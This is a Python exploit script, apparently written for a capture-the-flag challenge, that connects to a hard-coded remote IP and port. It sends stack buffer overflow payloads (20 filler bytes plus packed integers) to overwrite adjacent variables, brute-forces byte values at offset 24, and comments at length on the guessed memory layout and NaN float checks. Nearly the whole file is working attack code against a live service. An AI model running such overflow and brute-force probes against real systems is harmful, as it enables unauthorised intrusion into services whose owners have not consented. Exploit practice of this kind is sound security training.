import socket
import struct

def connect_and_send_raw(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(("13.201.98.118", 8084))
    
    banner = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            banner += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    
    s.send(data)
    
    response = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    
    s.close()
    return response

# NEW THEORY: There might be TWO variables!
# Layout: char buf[20]; int var1; int var2;
# var1 at offset 20, var2 at offset 24
# The code checks BOTH variables in sequence.
# var1 might be checked first (== 1 for honeypot, == 0xDEADBEEF for honeypot2)
# var2 is the float NaN check
# 
# When we send just 20+"A"*4, var1 gets set, var2 stays 0
# When we send 20+val1+val2, both get set
# 
# Earlier: A*20 + 0xFFFFFFFF gave "NaN achieved" because var1=0xFFFFFFFF 
# But 0xFFFFFFFF as var1: is it checked FIRST?
# 
# Wait, maybe the flow is:
# 1. Check if var2 is NaN -> NaN path
# 2. Otherwise, check var1 for honeypot values
# 
# When var2 is default (0), NaN check fails, so var1 determines output
# When var1 overflows into var2 (single 4-byte write), var2 stays at 0
# But when var1 = 0xFFFFFFFF and var2 is not set... hmm
# 
# Actually wait. Let me reconsider the earlier test where A*20 + single 4 bytes worked:
# A*20 + \x01\x00\x00\x00 -> honeypot 1
# A*20 + \xFF\xFF\xFF\xFF -> NaN message
# 
# Maybe there's actually a UNION or OVERLAP:
# A single int variable at offset 20 that's checked both as int AND as float
# 
# The float reinterpretation of 0xFFFFFFFF IS NaN (-NaN quiet)
# The float reinterpretation of 0x01000000 is NOT NaN
# 
# Going back to the key question:
# We get "NaN achieved, but causality violation required" when the value is
# negative NaN (0xFF800001-0xFFFFFFFF range)
# 
# "Causality violation" = the NaN needs to satisfy a condition that NaN normally can't
# NaN > 0 is FALSE, NaN < 0 is FALSE, NaN == anything is FALSE, NaN != anything is TRUE
# 
# Maybe the code checks: if (f == f) → but f is NaN so this is FALSE
# OR: if (f <= 0 || f >= 0) → for NaN this is FALSE (violates trichotomy!)
# 
# The "causality violation" = NaN violates the law of excluded middle
# In logic: for any x, either x >= 0 or x < 0 must be true
# But for NaN: NEITHER is true! This IS the "causality violation"
# 
# So maybe the code checks: if (!(f >= 0) && !(f < 0))
# This is TRUE only for NaN! And we already achieve NaN.
# But the message says we HAVEN'T achieved the violation yet...
# 
# Let me re-read: "NaN achieved, but causality violation required"
# Maybe "causality violation" is a SECOND condition after NaN
# 
# What if there's a second variable that needs to be set to a specific value?
# Let me do a comprehensive scan of the second variable

print("=== Comprehensive scan: NaN at offset 20, var2 at offset 24 ===")
# Scan all 256*4 = 1024 values for the second variable (checking byte by byte)
nan_val = struct.pack("<I", 0xFFFFFFFF)  # NaN at offset 20

# First, scan single bytes at offset 24
found_non_nan = False
for byte_val in range(256):
    payload = b"A" * 20 + nan_val + bytes([byte_val]) + b"\n"
    resp = connect_and_send_raw(payload)
    resp_text = resp.decode('utf-8', errors='replace').strip()
    if "causality" not in resp_text and resp_text != "Access denied." and resp_text:
        print(f"[!!] NaN + byte 0x{byte_val:02X}: {repr(resp_text)}")
        found_non_nan = True

if not found_non_nan:
    print("  No change with single byte after NaN")

# Try 2 bytes at offset 24  
print("\n=== NaN + 2 bytes at offset 24 ===")
for b1 in range(0, 256, 16):
    for b2 in range(0, 256, 16):
        payload = b"A" * 20 + nan_val + bytes([b1, b2]) + b"\n"
        resp = connect_and_send_raw(payload)
        resp_text = resp.decode('utf-8', errors='replace').strip()
        if "causality" not in resp_text and resp_text != "Access denied." and resp_text:
            print(f"[!!] NaN + 0x{b1:02X}{b2:02X}: {repr(resp_text)}")

# Also try: what if we need TWO SEPARATE WRITES? 
# E.g., send input twice?
print("\n=== Double input test ===")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("13.201.98.118", 8084))

banner = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        banner += chunk
        if len(chunk) < 4096:
            break
except socket.timeout:
    pass
print(f"Banner: {banner.decode('utf-8', errors='replace').strip()}")

# Send first input
s.send(b"A" * 20 + struct.pack("<I", 0xFFC00000) + b"\n")
import time
time.sleep(1)

resp1 = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp1 += chunk
        if len(chunk) < 4096:
            break
except socket.timeout:
    pass
print(f"Response 1: {resp1.decode('utf-8', errors='replace').strip()}")

# Try sending second input
s.send(b"causality\n")
time.sleep(1)

resp2 = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp2 += chunk
        if len(chunk) < 4096:
            break
except socket.timeout:
    pass
print(f"Response 2: {resp2.decode('utf-8', errors='replace').strip()}")

s.close()
